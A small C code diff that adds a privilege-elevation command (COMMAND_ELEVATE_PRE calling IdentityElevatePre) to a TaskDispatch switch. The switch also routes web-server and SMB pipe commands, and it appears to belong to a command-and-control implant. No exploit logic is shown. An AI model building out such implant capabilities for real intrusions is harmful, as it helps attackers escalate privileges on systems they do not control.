@@ -91,6 +91,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_WEBSERVER_LOCAL:
 			WebServerLocal(buffer, size);
 			break;
+		case COMMAND_ELEVATE_PRE:
+			IdentityElevatePre(buffer, size);
+			break;
 		case COMMAND_PIPE_OPEN_EXPLICIT:
 			ProtocolSmbOpenExplicit(buffer);
 			break;
